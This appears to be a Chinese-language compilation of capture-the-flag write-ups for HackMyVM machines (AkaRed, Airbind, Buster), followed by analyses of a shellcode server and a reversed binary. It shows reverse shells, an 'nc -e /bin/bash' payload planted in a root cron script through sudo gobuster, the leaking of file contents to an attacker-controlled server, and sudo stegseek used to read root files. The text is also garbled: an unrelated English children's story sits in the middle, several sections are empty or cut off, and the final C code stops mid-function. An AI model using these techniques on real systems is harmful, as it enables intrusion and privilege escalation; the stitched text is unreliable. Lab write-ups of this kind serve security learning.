title: HMV-AkaRed靶机渗透记录
content:
# 信息搜集
ip地址为`<INTERNAL_IP>` 
```shell
┌──(root㉿kali-plus)-[~]
└─# rustscan -a <INTERNAL_IP> 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open <INTERNAL_IP>:22
Open <INTERNAL_IP>:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 13:54 CST
Initiating ARP Ping Scan at 13:54
Scanning <INTERNAL_IP> [1 port]
Completed ARP Ping Scan at 13:54, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:54
Scanning lookup.hmv (<INTERNAL_IP>) [2 ports]
Discovered open port 80/tcp on <INTERNAL_IP>
Discovered open port 22/tcp on <INTERNAL_IP>
Completed SYN Stealth Scan at 13:54, 0.03s elapsed (2 total ports)
Nmap scan report for lookup.hmv (<INTERNAL_IP>)
Host is up, received arp-response (0.0010s latency).
Scanned at 2025-04-12 13:54:49 CST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:EB:F5:F2 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
```
## 获取 User Flag
扫出来 22 和 80 端口。80 端口处存在命令执行，测试了一下延时命令可以正常生效，说明这个点是可利用的。之前扫到的 `robots.txt` 内容是一个 base64 编码字符串，解码后像是一组凭据信息，但直接拿去 SSH 登录并没有成功，所以还是回到命令执行这个入口，构造一个反弹 shell 即可。拿到 shell 之后先去找 `user flag`。
```shell
┌──(root㉿kali-plus)-[~]                                             
└─# nc -lvnp 4444                                                      
Listening on <ATTACKER_IP> 4444                                     
Connection received on <INTERNAL_IP> 35044                            
python -c 'import pty;pty.spawn("/bin/bash")'                           
www-data@AkaRed:/var/www/html$ ls                                       
index.php  robots.txt                                              
www-data@AkaRed:/var/www/html$ cd ..                                    
www-data@AkaRed:/var/www$ cd ..                                         
www-data@AkaRed:/var$ cd ..                                                   
www-data@AkaRed:/$ ls                                                         
bin   home            lib32       media  root  sys  vmlinuz           
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old          
dev   initrd.img.old  libx32      opt    sbin  usr                     
etc   lib             lost+found  proc   srv   var                     
www-data@AkaRed:/$ cd home                                                    
www-data@AkaRed:/home$ ls                                                     
welcome                                                                 
www-data@AkaRed:/home$ cd welcome                                             
www-data@AkaRed:/home/welcome$ ls                                             
user.txt                                                                      
www-data@AkaRed:/home/welcome$ cat user.txt                  
<user flag>
```
## 提权
直接使用 `sudo -l` 会提示需要口令，但我们当时并不知道具体值，所以先上传 `linpeas.sh`，同时手动找一下可写目录。
```bash
www-data@AkaRed:/home/welcome$ find / -writable -type d 2>/dev/null           
find / -writable -type d 2>/dev/null                                          
/dev/mqueue                                                                   
/dev/shm                                                                      
/var/lib/php/sessions                                                         
/var/tmp                                                                      
/var/cache/apache2/mod_cache_disk                                             
/run/lock                                                                     
/run/lock/apache2                                                             
/tmp                                                                          
/proc/5217/task/5217/fd                                                       
/proc/5217/fd                                                                 
/proc/5217/map_files
```
发现 `/tmp` 目录可以写入。跑完 `linpeas` 之后，注意到 `/opt` 目录下存在一个 `showmepassword` 程序；结合提示信息，可以推断它会读取一个特定格式的输入文件。
```plain
//命令详解
seq 1 1000 是生成从1到1000的数字序列每个数字占一行，后面的命令作用是：xargs 会将 seq 1 1000 的每一行输入（即 1 到 1000 的数字）替换到 {} 的位置，并执行 echo a 命令。由于 {} 被替换为输入的每一行，但实际上我们并不关心输入的内容，只是利用 xargs 来循环执行 echo a 最终得到的是1000行 a 
```
```shell
www-data@AkaRed:/tmp$ seq 1 1000 | xargs -I {} echo "a" > xxoo                
seq 1 1000 | xargs -I {} echo "a" > xxoo                                      
www-data@AkaRed:/tmp$ wc -l xxoo                                              
wc -l xxoo                                                                    
1000 xxoo
www-data@AkaRed:/opt$ ./showmepassword                                        

input to /tmp/xxoo                                                            
when input 1000 count. u will get password                                   

```
这样就能拿到 welcome 用户的口令；除此之外，也可以直接用 `strings showmepassword` 去辅助分析。

welcome@AkaRed:~$ sudo -l                                                     
Matching Defaults entries for welcome on AkaRed:                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 
User welcome may run the following commands on AkaRed:                        
    (ALL : ALL) NOPASSWD: /usr/local/bin/stegseek
```
stegseek是一个图片隐写工具，可以把公钥写进图片里然后ssh连上去或者直接去把root.txt藏进flag里然后再提取出来
```shell
welcome@AkaRed:~$ cd /tmp                                                     
welcome@AkaRed:/tmp$ busybox wget http://<ATTACKER_IP>:9999/1.jpg             
Connecting to <INTERNAL_IP>:9999 (<INTERNAL_IP>:9999)                         
1.jpg                100% |*******************************************************************************************************************************************************************************************|  189k  0:00:00 ETA 
welcome@AkaRed:/tmp$ sudo stegseek --embed -cf /tmp/1.jpg -ef /root/root.txt  
Enter passphrase:                                                             
Re-Enter passphrase:                                                          
embedding "/root/root.txt" in "/tmp/1.jpg"... done                            
welcome@AkaRed:/tmp$ sudo stegseek --extract /tmp/1.jpg                       
Enter passphrase:                                                             
wrote extracted data to "root.txt".                                           
welcome@AkaRed:/tmp$ ls                                                       
1.jpg  root.txt  systemd-private-9083634fc3114dc3a20156d7d4b69b13-apache2.service-J3gU2L  systemd-private-9083634fc3114dc3a20156d7d4b69b13-systemd-timesyncd.service-zSK17d                                              
welcome@AkaRed:/tmp$ cat root.txt                                             
<root flag>
```

title: HMV-Airbind靶机渗透记录
content:
# 信息搜集
ip地址为`<INTERNAL_IP>`  扫一下端口
```shell
┌──(root㉿kali-plus)-[~]
└─# rustscan -a <INTERNAL_IP>

```
只有一个80端口，是一个登录界面，`<command>` 直接进去了，看到有about页面，进去看了发现这个服务是`Wallos v1.11.0` 搜了一下历史漏洞发现一个sql注入的洞，扫个目录先
```shell
┌──(root㉿kali-plus)-[~]
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u  http://<INTERNAL_IP>/ -x.txt,.php,.html
===============================================================
Gobuster v3.6

有一个数据库文件
```shell
┌──(root㉿kali-plus)-[~/Downloads]
└─# sqlite3 wallos.db                                                                                           
SQLite version 3.45.3 2024-04-15 13:34:05
Enter ".help" for usage hints.
sqlite> show databases;
Parse error: near "show": syntax error
  show databases;
  ^--- error here
sqlite> .tables
categories                     login_tokens                 
currencies                     migrations                   
cycles                         notifications                
fixer                          payment_methods              
frequencies                    settings                     
household                      subscriptions                
last_exchange_update           user                         
last_update_next_payment_date
sqlite> select * from user;
1|admin|admin@localhost.com|$2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S|1|0|en
```
连接上去之后能拿到用户信息，不过这里对应的口令其实前面已经通过弱口令猜到了，所以这一步主要算是验证。
## 获取 User Flag
还是回到这个漏洞上面，[exp-db](https://www.exploit-db.com/exploits/51924) 这个网站有利用方式，恰巧这个exp的作者就是sml，上传成功之后访问http://<INTERNAL_IP>/images/uploads/logos/目录就能看到刚刚上传的php，访问触发即可反弹shell
```shell
www-data@ubuntu:/$ sudo -l 
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
www-data@ubuntu:/$ sudo su -
sudo su -
root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# ls
ls
user.txt
root@ubuntu:~# cat user.txt
cat user.txt
<user flag>
```
## 提权
看到目录下有一个.ssh，进去看到ssh连接私钥
```shell
root@ubuntu:~# ls -al
ls -al
total 40
drwx------  4 root root 4096 May 21  2024 .
drwxr-xr-x 17 root root 4096 Apr 26 16:21 ..
lrwxrwxrwx  1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 17  2022 .bashrc
-rw-------  1 root root   20 May 21  2024 .lesshst
drwxr-xr-x  3 root root 4096 Apr  1  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 May 21  2024 .selected_editor
-rw-------  1 root root  300 May 21  2024 .sqlite_history
drwx------  2 root root 4096 Apr  2  2024 .ssh
-rwx------  1 root root   33 Apr  2  2024 user.txt
-rw-------  1 root root    0 May 21  2024 .wpa_cli_history
root@ubuntu:~# cd .ssh
cd .ssh
root@ubuntu:~/.ssh# ls -al
ls -al
total 24
drwx------ 2 root root 4096 Apr  2  2024 .
drwx------ 4 root root 4096 May 21  2024 ..
-rw------- 1 root root 2590 Apr  2  2024 id_rsa
-rw-r--r-- 1 root root  565 Apr  2  2024 id_rsa.pub
-rw------- 1 root root  978 Apr  2  2024 known_hosts
-rw-r--r-- 1 root root  142 Apr  2  2024 known_hosts.old
root@ubuntu:~/.ssh# cat id_rsa
cat id_rsa
<REDACTED_PRIVATE_KEY>
root@ubuntu:~/.ssh# cat id_rsa.pub
cat id_rsa.pub
<REDACTED_PUBLIC_KEY>
```
尝试写到本地然后登录，使用命令`ssh-keygen -y -f id ` 发现得到的结果是一样的
```shell
┌──(root㉿kali-plus)-[~]
└─# ssh-keygen -y -f id                  
<REDACTED_PUBLIC_KEY>
```
使用 SSH 直接连接发现卡住了，应该是被防火墙拦截了。再看网卡信息时，发现主机还存在一张内网网卡，猜测后续可能需要走另一条链路。
```shell
root@ubuntu:~/.ssh# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet <INTERNAL_IP>/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet <INTERNAL_IP>/24 brd <INTERNAL_IP> scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::dea1:f7ff:fe82:7613/64 scope link 
       valid_lft forever preferred_lft forever
3: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
6: ap0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
```
猜测可能是要用ipv6的地址去登录
```shell

title: HMV-Buster靶机渗透记录
content:
# 信息搜集
看一眼mac地址：`08:00:27:36:6e:6f`使用`arp-scan -l`确定ip地址

```plain
┌──(root㉿kali-plus)-[~]
└─# arp-scan -l    
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1d:89:b5, IPv4: <INTERNAL_IP>
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
<INTERNAL_IP>	0a:00:27:00:00:17	(Unknown: locally administered)
<INTERNAL_IP>	08:00:27:50:3f:be	PCS Systemtechnik GmbH
<INTERNAL_IP>	08:00:27:36:6e:6f	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.123 seconds (120.58 hosts/sec). 3 responded
```

ip地址为`<INTERNAL_IP>`使用nmap扫描一下端口情况

```plain
┌──(root㉿kali-plus)-[~]
└─# nmap <INTERNAL_IP>     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 17:44 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for <INTERNAL_IP>
Host is up (0.0021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:36:6E:6F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

确定`22`和`80`端口开放，先看一眼 80 端口，发现是 WordPress 博客，于是先用 `wpscan` 做插件和用户枚举。

## 80端口渗透-user flag
这里直接使用 `wpscan --url http://<INTERNAL_IP> -e u,ap --plugins-detection aggressive`。

```plain
┌──(root㉿kali-plus)-[~]
└─# wpscan --url http://<INTERNAL_IP> -e u,ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25

找到了配置文件的一些信息

这里我只保留成功利用的 `welcome` 账户过程，口令部分已经脱敏处理。

```plain
┌──(root㉿kali-plus)-[~]
└─# vi hash

└─# john hash

拿到 `welcome` 的口令后，直接切换到该用户查看 flag。

```plain
$ cat user.txt
cat user.txt
<user flag>
```

先拿下user's flag，接着找提权点进行提权

## 提权
```plain
$ sudo -l
Matching Defaults entries for welcome on listen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster
```

尝试看了一下这个文件的内容，根本不是人读的，搜了一下才发现`gobuster`是一款用于目录和文件枚举的开源工具，简单看了一下使用教程([https://blog.csdn.net/2302_82189125/article/details/135999920](https://blog.csdn.net/2302_82189125/article/details/135999920))

我一开始尝试直接用 `gobuster` 去碰 `root.txt`，但这条思路没有产出。

```plain
$ sudo gobuster -u "http://<INTERNAL_IP>" -w /root.txt
2025/02/25 10:42:51 [!] 1 error occurred:
        * Wordlist (-w): File does not exist: /root.txt
```

貌似rootflag的名字不是root.txt，下面就没有什么思路了，看了眼大佬的博客，他们用到了一个`pspy64`这个工具（ pspy是一个[命令行工具](https://www.kitploit.com/search/label/Command%20Line)，它可以在没有Root权限的情况下，监控Linux进程。）

 把pspy64传到kali,在自己的kali上起个服务，把pspy64下载到靶机中

```plain
python3 -m http.server 80
wget http://<INTERNAL_IP>/pspy64
chmod +x pspy64
./pspy64
sudo gobuster -w /opt/.test.sh -u http://<INTERNAL_IP> #默认模式为dir扫描目录文件w为指定字典，u指定url
<INTERNAL_IP> - - [24/Jan/2025 06:21:00] "GET /echo%20test HTTP/1.1" 404 -
```

```plain
2025/02/25 12:12:01 CMD: UID=0    PID=3975   | /bin/sh /sbin/dhclient-script 
2025/02/25 12:12:01 CMD: UID=0    PID=3976   | /bin/sh /sbin/dhclient-script 
2025/02/25 12:12:01 CMD: UID=0    PID=3977   | /bin/sh /sbin/dhclient-script 
2025/02/25 12:12:01 CMD: UID=0    PID=3978   | /usr/sbin/CRON -f 
2025/02/25 12:12:01 CMD: UID=0    PID=3979   | /usr/sbin/CRON -f 
2025/02/25 12:12:01 CMD: UID=0    PID=3980   | /bin/sh -c /bin/bash /opt/.test.sh 
```

这是运行 `pspy64` 之后的一部分，可以看到 root 会定时执行 `/opt/.test.sh`，于是继续围绕这个脚本想办法。

```plain
welcome@listen:~$ cat /opt/.test.sh
cat: /opt/.test.sh: Permission denied
```

看不了一点

```plain
welcome@listen:/opt$ ls -al
total 12
drwxr-xr-x  2 root root 4096 Jan  7 23:57 .
drwxr-xr-x 18 root root 4096 Jan  7 21:50 ..
-rwx------  1 root root   10 Jan  7 23:57 .test.sh
```

继续利用 `gobuster` 把 `/opt/.test.sh` 当作字典文件去探测外部服务，结果如下：

```plain
welcome@listen:/opt$ sudo gobuster -w /opt/.test.sh -u http://<INTERNAL_IP>:9999

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<INTERNAL_IP>/
[+] Threads      : 10
[+] Wordlist     : /opt/.test.sh
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2025/02/25 12:26:20 Starting gobuster
=====================================================
2025/02/25 12:26:20 [!] unable to connect to http://<INTERNAL_IP>/: Get http://<INTERNAL_IP>/: dial tcp <INTERNAL_IP>:80: connect: connection refused
=====================================================
2025/02/25 12:26:20 Finished
=====================================================
welcome@listen:/opt$ sudo gobuster -w /opt/.test.sh -u http://<INTERNAL_IP>:9999

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<ATTACKER_IP>:9999/
[+] Threads      : 10
[+] Wordlist     : /opt/.test.sh
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2025/02/25 12:27:38 Starting gobuster
=====================================================
=====================================================
2025/02/25 12:27:38 Finished
=====================================================
```

这一步的核心思路是：把 `/opt/.test.sh` 当作 `gobuster` 的字典文件，再把 `-u` 指向自己控制的 HTTP 服务。这样靶机访问我们服务时，请求路径里就会泄露该脚本的内容。

```plain
Serving HTTP on <PUBLIC_IP> port 9999 (http://<ATTACKER_IP>:9999/) ...
<INTERNAL_IP> - - [26/Feb/2025 20:12:49] "GET / HTTP/1.1" 200 -
<INTERNAL_IP> - - [26/Feb/2025 20:12:49] code 404, message File not found
<INTERNAL_IP> - - [26/Feb/2025 20:12:49] "GET /77aacc5f-f1f3-4c5f-943f-d890c284bc14 HTTP/1.1" 404 -
<INTERNAL_IP> - - [26/Feb/2025 20:12:49] code 404, message File not found
<INTERNAL_IP> - - [26/Feb/2025 20:12:49] "GET /echo%20test HTTP/1.1" 404 -
```

他里面有个`echo test`的定时任务，然后下面的步骤是

可以在自己的kali中新建一个文件夹，然后创建一个a，再起个服务，然后返回靶机运行gobuster的指令

```plain
mkdir buster
cd buster
touch a
python3 -m http.server 9999
```

```plain
welcome@listen:/opt$ cd /tmp
welcome@listen:/tmp$ ls
systemd-private-62ede0bd298b4c10934121beaac91a3a-systemd-timesyncd.service-4ariZG
welcome@listen:/tmp$ echo 'a' > a.txt
welcome@listen:/tmp$ sudo gobuster -w a.txt -u http://<INTERNAL_IP>:9999 -n -q
/a
```

返回/a的原因是我们关闭了状态码的显示并使用-q开启了安静模式，因此返回的结果就是所扫描到的目录路径

(前提是kali上开启服务的文件夹中有a这个文件) 这样就能拼接字符了，既然能够拼接字符，那么可以尝试一下拼接出一个反弹shell的命令，还是在kali上的那个文件夹中，新建一个tmp文件夹(因为我们在/tmp文件夹下)，然后文件夹下面有一个b文件

```plain
mkdir tmp
cd tmp
touch b
cd ..
python3 -m http.server 9999
```

```plain
welcome@listen:/tmp$ echo 'nc -e /bin/bash <INTERNAL_IP> 4444' > b
welcome@listen:/tmp$ chmod +x b
welcome@listen:/tmp$ pwd
/tmp
welcome@listen:/tmp$ echo 'tmp/b' > a.txt
welcome@listen:/tmp$ sudo gobuster -w a.txt -u http://<INTERNAL_IP>:9999 -n -q
/tmp/b
```

这一步的目的是拼接出 `/tmp/b` 这个路径，其中 `b` 文件里保存的是反弹 shell 命令。随后在原来的 `gobuster` 命令后面加上 `-o /opt/.test.sh`，就能把扫描结果写回定时任务脚本；等 root 的定时任务再次执行时，就会触发我们写进去的命令。

```plain
sudo gobuster -w a.txt -u http://<INTERNAL_IP>:9999 -n -q -o /opt/.test.sh
```

```plain
┌──(root㉿kali-plus)-[~]
└─# nc -lvvp 4444
nc: getnameinfo: Temporary failure in name resolution
id
nc: getnameinfo: Temporary failure in name resolution
uid=0(root) gid=0(root) groups=0(root)
```

可以看到已经监听到了，下面直接拿root flag即可

## 小结
这个靶场，先从外网打点，还是挺好打的，因为是wordpress搭建的博客系统，先使用`wpscan`扫描一下发现有一些插件，可以搜到插件的漏洞，有现成的poc，直接利用就好了，可以执行命令，直接反弹shell，但是发现有其他2个用户，既然是wordpress了，而且还有配置文件，就能拿到数据库的账密，连进去找一下welcome的密码，登录进welcome用户拿到user flag，下面提权就是围绕`gobuster`这个工具可以读取文件的内容，也可以写入内容到指定文件，这样就能把反弹shell的命令写到定时文件中，其中还有一个无需root权限就能查看定时任务的工具`pspy64`,这样一来，只要定时任务被执行，就能拿到root权限的shell，达到提权的效果

```plain
这段代码是一个监听6666端口的TCP服务器，其功能是接收客户端发送的Shellcode代码并执行，但会过滤特定危险字节以防止攻击。以下是详细分析：
1. 初始化和信号处理

    信号处理：注册信号处理函数，处理SIGSEGV（段错误）和SIGPIPE（管道破裂）信号，增强程序健壮性。

    创建套接字：使用socket(2, 1, 0)创建TCP套接字（AF_INET + SOCK_STREAM）。

    设置地址重用：通过setsockopt设置SO_REUSEADDR选项，避免端口占用问题。

2. 绑定与监听

    绑定端口：将套接字绑定到本地6666端口（ntohs(6666)转换为网络字节序）。

    监听连接：调用listen开始监听，队列长度为5。

3. 接受客户端连接

    循环接受连接：在无限循环中通过accept接收客户端连接，返回新的文件描述符v21。

    I/O重定向：使用dup2将标准输入、输出、错误重定向到客户端套接字，实现与客户端的交互。

4. 数据读取与过滤

    读取数据：从客户端读取最多4096字节（0x1000）到栈缓冲区buf。

    字节过滤检查：遍历每个字节，检查是否存在于全局变量forbidden_bytes中。若存在，则拒绝执行并返回错误信息。

5. Shellcode执行

    内存映射：通过mmap分配可读、可写、可执行的内存区域（PROT_READ|WRITE|EXEC）。

    代码复制与执行：将客户端发送的数据（Shellcode）复制到映射的内存，并跳转执行。

    清理资源：执行后调用munmap释放内存，关闭连接。

关键安全机制

    禁止字节过滤：通过forbidden_bytes阻止包含危险指令（如syscall）的代码执行。

    内存保护：使用mmap的MAP_ANONYMOUS标志避免文件映射，限制内存作用域。

潜在风险

    过滤绕过：若forbidden_bytes未覆盖所有危险指令（如编码后的Shellcode），仍可能执行恶意代码。

    内存执行风险：允许任意代码执行存在极高风险，需严格限制客户端信任度。

总结

该程序是一个实验性Shellcode执行环境，设计上通过端口监听接收并运行代码，但加入了基础过滤机制。需注意其安全隐患，适用于封闭测试环境，不建议暴露于公网。
```

接下来可以使用`dpkg -v`来查看一下哪些文件被修改过

```plain
dpkg是“Debian Package”的缩写，是Debian及其衍生发行版（如Ubuntu）中用于软件包管理的核心命令行工具。
dpkg -V命令用于验证已安装的软件包，检查其文件是否被修改过。具体来说，dpkg -V会将当前系统中安装的软件包的文件与软件包原始版本中的文件进行比较，以检测文件是否发生了变化。这在检查系统安全性或确认文件是否被篡改时非常有用。
```

The Compass and the Campfire

David knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. "Lost?" Jake whispered, staring at the identical trees clawing at the twilight. David’s calloused fingers brushed the cracked compass in his palm—a relic from his father, its needle trembling like a moth. "Not lost," he lied. "Just… rerouting."

Jake’s eyes narrowed, too sharp for comfort. "Your compass is broken."

A chuckle escaped David, brittle as dry leaves. "Compasses don’t break, bud. They… forget." He flipped it open, the glass fogged with age. "See? North isn’t where it should be. It’s where it chooses to be tonight."

The boy frowned, then yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its tail flicking like a metronome. Jake’s fear dissolved into giggles. David watched, throat tight. He’s still young enough to laugh at squirrels.

"Dad?" Jake unzipped his jacket, revealing three granola bars and a glowstick. "We’ve got supplies. Let’s build a fort."

They wove branches into a crooked shelter, Jake’s hands steady where David’s shook. When the first stars pierced the canopy, David confessed: "Grandpa gave me this compass the day I got lost in the mall. Told me it’d always point home."

Jake snapped the glowstick, bathing their fort in alien green. "Does it work now?"

The needle quivered, settling northwest. Toward the distant highway hum, not their cabin’s woodsmoke. David closed the brass lid. "Nope. But you do." He nodded at Jake’s pocket—where a crumpled trail map peeked out, dotted with the boy’s doodled dinosaurs.

Dawn found them at the cabin’s porch, guided by Jake’s roars laughter and the squirrels he’d named "Sir Nibbles". The compass stayed in David’s pocket, its secret safe: true north had shifted years ago, anyway—from steel poles to a gap-toothed grin eating pancakes at 6 AM.

下面就是转为分析getroot的二进制文件了，还是找到main函数，让deepseek去分析

```plain
int __fastcall main(int argc, const char **argv, const char **envp)
{
  double v3; // xmm0_8
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax
  int v8; // ebx
  unsigned int v9; // eax
  __int64 v10; // rax
  __int64 v11; // rax
  char v13[256]; // [rsp+10h] [rbp-260h] BYREF
  __int64 v14; // [rsp+110h] [rbp-160h] BYREF
  char v15[32]; // [rsp+220h] [rbp-50h] BYREF
  int v16; // [rsp+240h] [rbp-30h] BYREF
  int v17; // [rsp+244h] [rbp-2Ch] BYREF
  int v18; // [rsp+248h] [rbp-28h] BYREF
  char v19; // [rsp+24Fh] [rbp-21h] BYREF
  double v20; // [rsp+250h] [rbp-20h]
  int v21; // [rsp+258h] [rbp-18h]
  int v22; // [rsp+25Ch] [rbp-14h]

  if ( argc > 1 )
  {
    v22 = atoi(argv[1]);
    v9 = time(0LL);
    srand(v9);
    v21 = rand() % 86400;
    generate_normal_distribution();
    v20 = v3;
    v16 = (5.0 * v3) + v21;
    v17 = 86399;
    v10 = std::min<int>(&v16, &v17);
    v18 = 0;
    v16 = *std::max<int>(&v18, v10);
    std::allocator<char>::allocator(&v19);
    std::string::basic_string(v15, "/root/cred", &v19);
    std::allocator<char>::~allocator(&v19);
    if ( v22 == v16 + 12345 )
    {
      std::ifstream::basic_ifstream(v13, v15, 8LL);
      if ( std::ios::operator bool(&v14) )
      {
        v11 = std::ifstream::rdbuf(v13);
        std::ostream::operator<<(&std::cout, v11);
      }
      std::ifstream::~ifstream(v13);
    }
    v8 = 0;
    std::string::~string(v15);
  }
  else
  {
    v4 = std::operator<<<std::char_traits<char>>(&std::cerr, "Usage: ", envp);
    v5 = std::operator<<<std::char_traits<char>>(v4, *argv, v4);
    v7 = std::operator<<<std::char_traits<char>>(v5, " <magic_number>", v6);
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
    return 1;
  }
  return v8;
}
```

```plain
这段代码是一个需要特定魔法数字（magic_number）才能访问 /root/cred 文件的程序。它结合了伪随机数生成和正态分布计算来动态生成一个校验值，只有输入正确的参数才能解密并显示文件内容。
代码逻辑分析
1. 参数检查
c
复制

if ( argc > 1 )

    检查是否提供了命令行参数（argc > 1）。

    如果没有参数，打印使用说明并退出：
    c
    复制

    std::cerr << "Usage: " << argv[0] << " <magic_number>" << std::endl;
    return 1;

2. 初始化随机数
c
复制

v22 = atoi(argv[1]);  // 用户输入的参数
v9 = time(0LL);       // 获取当前时间戳
srand(v9);            // 用时间戳初始化随机数种子
v21 = rand() % 86400; // 生成 0~86399 的随机数（1天内的秒数）

    v22 是用户输入的参数（argv[1]）。

    v21 是一个基于当前时间的随机数（范围：0~86399）。

3. 正态分布计算
c
复制

generate_normal_distribution();  // 生成正态分布值
v20 = v3;                       // 存储正态分布结果
v16 = (5.0 * v3) + v21;         // 计算偏移值

    generate_normal_distribution() 生成一个符合**标准正态分布（μ=0, σ=1）**的随机数 v3。

    v16 = 5.0 * v3 + v21：

        5.0 * v3 引入随机波动（±5σ）。

        + v21 确保最终值在 v21 附近。

4. 范围约束
c
复制

v17 = 86399;
v10 = std::min<int>(&v16, &v17);  // 确保 v16 ≤ 86399
v18 = 0;
v16 = *std::max<int>(&v18, v10);  // 确保 v16 ≥ 0

    v16 被限制在 0~86399 之间（防止越界）。

5. 校验魔法数字
c
复制

if ( v22 == v16 + 12345 )

    用户输入的 v22 必须等于 v16 + 12345 才能通过校验。

    12345 是一个固定偏移量，用于增加破解难度。

6. 读取 /root/cred 文件
c
复制

std::ifstream::basic_ifstream(v13, "/root/cred", 8LL);
if ( std::ios::operator bool(&v14) )  // 检查文件是否成功打开
{
    v11 = std::ifstream::rdbuf(v13);
    std::ostream::operator<<(&std::cout, v11);  // 输出文件内容
}

    如果校验通过，程序会读取 /root/cred 并输出其内容。

    否则，直接退出。

关键点总结

    动态校验机制：

        基于当前时间（time(0)）生成随机数 v21。

        引入正态分布（generate_normal_distribution()）增加随机性。

        最终校验值 v16 + 12345 是动态计算的，每次运行都可能不同。

    文件访问控制：

        只有提供正确的 magic_number 才能读取 /root/cred。

        该文件可能是敏感凭证（如口令已脱敏。

    安全设计：

        使用 srand(time(0)) 确保每次运行的校验值不同。

        正态分布 增加了逆向工程的难度。
```

这是deepseek的解释，直接让deepseek帮我们写一个生成一个输出只有数字的代码，并给我们编译方案

```c
#include <iostream>
#include <cmath>
#include <ctime>
#include <cstdlib>
#include <algorithm>

using namespace std;

double generate_normal_distribution() {
    // 使用两次rand()，避免与后续rand()调用顺序冲突
    double x = rand() / 2147483647.0; // 注意：2147483647 = 0x7FFFFFFF
    double v3 = rand() / 2147483647.0;

    double v0 = log(x);          // 原IDA伪代码中的log计算
    double v2 = sqrt(-2.0 * v0); // 平方根部分

    // 6.283185307179586对应2*M_PI的精度
    return cos(6.283185307179586 * v3) * v2;
}

int main() {
